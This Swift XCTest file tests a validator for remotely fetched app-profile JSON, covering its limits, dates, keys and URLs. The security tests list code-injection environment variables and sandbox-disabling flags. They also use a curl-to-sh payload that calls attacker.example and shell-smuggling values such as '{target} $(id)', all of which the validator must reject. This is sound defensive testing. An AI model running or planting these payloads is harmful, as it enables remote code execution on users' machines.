import DuplicatorCore
import XCTest
@testable import CompatProfiles

final class ProfilesDocumentTests: XCTestCase {
    func testDecodesTheSpecExample() throws {
        let json = #"""
        {
          "schemaVersion": 1,
          "updated": "2026-10-09",
          "apps": {
            "com.anthropic.claudefordesktop": {
              "name": "Claude",
              "status": "verified",
              "family": "electron",
              "args": [],
              "env": {},
              "newWindowCommand": null,
              "notes": "Each instance has its own claude_desktop_config.json inside the data folder."
            }
          },
          "webApps": { "whatsapp": { "name": "WhatsApp", "url": "https://web.whatsapp.com", "userAgent": "chrome", "badgeRegex": "\\((\\d+)\\)", "extraHosts": ["whatsapp.com"], "iconURL": "..." } }
        }
        """#

        let document = try ProfilesDocument.decodeValidated(from: Data(json.utf8))

        XCTAssertEqual(document.schemaVersion, 1)
        XCTAssertEqual(document.updated, "2026-10-09")
        XCTAssertEqual(document.apps, ["com.anthropic.claudefordesktop": AppProfile(
            name: "Claude", status: .verified, family: .electron,
            notes: "Each instance has its own claude_desktop_config.json inside the data folder.")])
        XCTAssertEqual(document.webApps, ["whatsapp": WebAppPreset(
            name: "WhatsApp", url: "https://web.whatsapp.com", userAgent: "chrome", badgeRegex: #"\((\d+)\)"#,
            extraHosts: ["whatsapp.com"], iconURL: "...")])
    }

    func testUnknownKeysAreTolerated() throws {
        let data = try makeProfilesData(
            apps: ["com.example.app": appEntry(extra: ["minimumVersion": "2.0", "tags": ["a", "b"]])],
            webApps: ["whatsapp": webAppEntry(extra: ["sandbox": true])],
            extra: ["generator": "hand-written", "mirrors": ["https://example.com"]])

        let document = try ProfilesDocument.decodeValidated(from: data)

        XCTAssertEqual(document.apps["com.example.app"]?.name, "Example")
        XCTAssertEqual(document.webApps["whatsapp"]?.url, "https://web.whatsapp.com")
    }

    func testMissingOptionalFieldsTakeDefaults() throws {
        let document = try ProfilesDocument.decodeValidated(from: makeProfilesData(apps: ["com.example.app": appEntry()]))

        XCTAssertEqual(document.apps["com.example.app"], AppProfile(name: "Example", status: .partial))
        XCTAssertEqual(document.webApps, [:])

        let web = try ProfilesDocument.decodeValidated(from: makeProfilesData(webApps: ["whatsapp": webAppEntry()]))
        XCTAssertEqual(web.webApps["whatsapp"], WebAppPreset(name: "WhatsApp", url: "https://web.whatsapp.com"))
    }

    func testUnknownFamilyDecodesAsNil() throws {
        let data = try makeProfilesData(apps: [
            "com.example.qt": appEntry(extra: ["family": "qt"]),
            "com.example.null": appEntry(extra: ["family": NSNull()]),
            "com.example.chromium": appEntry(extra: ["family": "chromium"]),
        ])

        let apps = try ProfilesDocument.decodeValidated(from: data).apps

        XCTAssertEqual(apps.count, 3, "an unknown family never drops the entry")
        XCTAssertNil(apps["com.example.qt"]?.family)
        XCTAssertNil(apps["com.example.null"]?.family)
        XCTAssertEqual(apps["com.example.chromium"]?.family, .chromium)
    }

    func testRejectsUnsupportedSchemaVersion() throws {
        assertRejects(try makeProfilesData(schemaVersion: 2), with: .unsupportedSchemaVersion(2))
        assertRejects(try makeProfilesData(schemaVersion: 0), with: .unsupportedSchemaVersion(0))
        // The version gate runs before the full decode, so a future layout is reported as a version problem.
        assertRejects(try makeProfilesData(schemaVersion: 2, extra: ["apps": ["not", "a", "dictionary"]]),
                      with: .unsupportedSchemaVersion(2))
    }

    func testRejectsMalformedJSON() throws {
        assertRejects(Data("not json".utf8), with: .malformed("the data is not valid JSON"))
        assertRejects(try jsonData(["updated": "2026-10-09", "apps": [String: Any]()]),
                      with: .malformed("missing key schemaVersion"))
        assertRejects(try jsonData(["schemaVersion": 1, "updated": "2026-10-09"]),
                      with: .malformed("missing key apps"))
        assertRejects(try makeProfilesData(apps: ["com.example.app": ["status": "partial"]]),
                      with: .malformed("missing key apps.com.example.app.name"))
        let wrongType = try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["args": "--single-string"])])
        XCTAssertThrowsError(try ProfilesDocument.decodeValidated(from: wrongType)) { error in
            guard case .malformed = error as? ProfilesError else { return XCTFail("expected malformed, got \(error)") }
        }
    }

    func testRejectsUnknownStatus() throws {
        assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(status: "beta")]),
                      with: .invalidField("apps.com.example.app.status"))
        assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(status: "Verified")]),
                      with: .invalidField("apps.com.example.app.status"))
    }

    func testRejectsBadUpdatedDates() throws {
        let bad = ["2026-13-01", "2026-02-30", "2026-00-10", "26-10-09", "2026-1-09", "2026-10-09T00:00:00Z", "",
                   " 2026-10-09", "2026-10-09\n"]
        for updated in bad {
            assertRejects(try makeProfilesData(updated: updated), with: .invalidUpdatedDate(updated))
        }
        XCTAssertNoThrow(try ProfilesDocument.decodeValidated(from: makeProfilesData(updated: "2028-02-29")), "leap day")
    }

    func testRejectsOversizedInput() throws {
        assertRejects(Data(repeating: UInt8(ascii: " "), count: ProfilesDocument.maxBytes + 1), with: .tooLarge(1_048_577))

        var atLimit = try makeProfilesData(apps: ["com.example.app": appEntry()])
        atLimit.append(Data(repeating: UInt8(ascii: " "), count: ProfilesDocument.maxBytes - atLimit.count))
        XCTAssertEqual(atLimit.count, ProfilesDocument.maxBytes)
        XCTAssertNoThrow(try ProfilesDocument.decodeValidated(from: atLimit), "trailing whitespace up to the cap is valid")
    }

    func testRejectsLongStringsAndNUL() throws {
        let limit = String(repeating: "a", count: ProfilesDocument.maxStringLength)
        XCTAssertNoThrow(try ProfilesDocument.decodeValidated(from: makeProfilesData(apps: ["com.example.app": appEntry(name: limit)])))

        let cases: [(entry: [String: Any], path: String)] = [
            (appEntry(name: limit + "a"), "apps.com.example.app.name"),
            (appEntry(name: ""), "apps.com.example.app.name"),
            (appEntry(extra: ["notes": "line\u{0}break"]), "apps.com.example.app.notes"),
            (appEntry(extra: ["args": ["--ok", "bad\u{0}"]]), "apps.com.example.app.args[1]"),
            (appEntry(extra: ["env": ["API_URL": limit + "a"]]), "apps.com.example.app.env.API_URL"),
            (appEntry(extra: ["newWindowCommand": limit + "a"]), "apps.com.example.app.newWindowCommand"),
        ]
        for (entry, path) in cases {
            assertRejects(try makeProfilesData(apps: ["com.example.app": entry]), with: .invalidField(path))
        }
    }

    func testRejectsTooManyEntries() throws {
        func apps(_ count: Int) -> [String: Any] {
            Dictionary(uniqueKeysWithValues: (0..<count).map { ("com.example.app\($0)", appEntry() as Any) })
        }
        XCTAssertEqual(try ProfilesDocument.decodeValidated(from: makeProfilesData(apps: apps(500))).apps.count, 500)
        assertRejects(try makeProfilesData(apps: apps(501)), with: .tooMany("apps"))

        let webApps = Dictionary(uniqueKeysWithValues: (0...200).map { ("web\($0)", webAppEntry() as Any) })
        assertRejects(try makeProfilesData(webApps: webApps), with: .tooMany("webApps"))

        let arguments = (0...64).map { "--flag\($0)" }
        assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["args": arguments])]),
                      with: .tooMany("apps.com.example.app.args"))
        let environment = Dictionary(uniqueKeysWithValues: (0...64).map { ("VAR_\($0)", "1") })
        assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["env": environment])]),
                      with: .tooMany("apps.com.example.app.env"))
        let hosts = (0...64).map { "host\($0).example.com" }
        assertRejects(try makeProfilesData(webApps: ["whatsapp": webAppEntry(extra: ["extraHosts": hosts])]),
                      with: .tooMany("webApps.whatsapp.extraHosts"))
    }

    func testRejectsBadKeys() throws {
        let badIdentifiers = ["", "-leading.dash", "has space", "com.example/app", "com.example.app\n",
                              String(repeating: "a", count: 256)]
        for identifier in badIdentifiers {
            assertRejects(try makeProfilesData(apps: [identifier: appEntry()]),
                          with: .invalidField("apps." + String(identifier.prefix(100))))
        }
        assertRejects(try makeProfilesData(apps: ["com.Example.App": appEntry(), "com.example.app": appEntry()]),
                      with: .invalidField("apps.com.example.app duplicates another bundle identifier"))
        for key in ["1BAD", "HAS-DASH", "", "SPACE KEY"] {
            assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["env": [key: "1"]])]),
                          with: .invalidField("apps.com.example.app.env.\(key)"))
        }
        for key in ["WhatsApp", "-web", "web_app", ""] {
            assertRejects(try makeProfilesData(webApps: [key: webAppEntry()]), with: .invalidField("webApps.\(key)"))
        }
    }

    func testRejectsInsecureOrInvalidWebAppFields() throws {
        let cases: [(extra: [String: Any], path: String)] = [
            (["url": "http://web.whatsapp.com"], "webApps.whatsapp.url"),
            (["url": "https://"], "webApps.whatsapp.url"),
            (["url": "javascript:alert(1)"], "webApps.whatsapp.url"),
            (["url": "file:///etc/passwd"], "webApps.whatsapp.url"),
            (["name": ""], "webApps.whatsapp.name"),
            (["userAgent": "x\u{0}"], "webApps.whatsapp.userAgent"),
            (["badgeRegex": "(unclosed"], "webApps.whatsapp.badgeRegex"),
            (["extraHosts": ["whatsapp.com", "bad host"]], "webApps.whatsapp.extraHosts[1]"),
            (["extraHosts": ["-bad.example.com"]], "webApps.whatsapp.extraHosts[0]"),
        ]
        for (extra, path) in cases {
            assertRejects(try makeProfilesData(webApps: ["whatsapp": webAppEntry(extra: extra)]), with: .invalidField(path))
        }
    }

    func testRejectsLaunchControlEnvironmentAndArguments() throws {
        // Fetched profiles are untrusted: they may not inject code into the target or take over data separation.
        for key in ["DYLD_INSERT_LIBRARIES", "LD_PRELOAD", "MAD_SHORTCUT_NAME", "XRE_PROFILE_PATH", "NODE_OPTIONS",
                    "ELECTRON_RUN_AS_NODE", "JAVA_TOOL_OPTIONS", "_JAVA_OPTIONS", "HOME", "CFFIXED_USER_HOME"] {
            assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["env": [key: "x"]])]),
                          with: .invalidField("apps.com.example.app.env.\(key)"))
        }
        for argument in ["--inspect", "--inspect-brk=9229", "--INSPECT", "--remote-debugging-port=9222",
                         "-remote-debugging-pipe", "--load-extension=/tmp/x", "--disable-web-security", "--no-sandbox",
                         "--renderer-cmd-prefix=/bin/sh", "--user-data-dir=/tmp/y", "--profile-directory=Work",
                         "-profile", "-P", "-data", "-vmargs", "-javaagent:/tmp/agent.jar"] {
            assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["args": [argument]])]),
                          with: .invalidField("apps.com.example.app.args[0]"))
        }
        let allowed = try makeProfilesData(apps: ["com.example.app": appEntry(extra: [
            "args": ["--enable-features=Foo", "--force-dark-mode", "-new-instance", "--homepage-flag"],
            "env": ["ELECTRON_ENABLE_LOGGING": "1", "HOMEBREW_NO_ANALYTICS": "1", "DYLDX": "1"],
        ])])
        XCTAssertNoThrow(try ProfilesDocument.decodeValidated(from: allowed))
    }

    func testRejectsRestrictedNewWindowCommands() throws {
        // Security audit C1: a remote profile may only plant {target} / open templates with plain flags.
        let payload = #"/bin/sh -c curl${IFS}-fsSL${IFS}https://attacker.example/p|sh"#
        for command in [payload, "/bin/sh -c id", "open -na {target}", "{target} $(id)", "{target} -n;id",
                        "/usr/bin/open -na {target} --args --user-data-dir=/tmp/x"] {
            assertRejects(try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["newWindowCommand": command])]),
                          with: .invalidField("apps.com.example.app.newWindowCommand"))
        }
        for command in ["/usr/bin/open -na {target} --args --new-window", "{target} --new-window"] {
            let data = try makeProfilesData(apps: ["com.example.app": appEntry(extra: ["newWindowCommand": command])])
            XCTAssertEqual(try ProfilesDocument.decodeValidated(from: data).apps["com.example.app"]?.newWindowCommand, command)
        }
    }
}
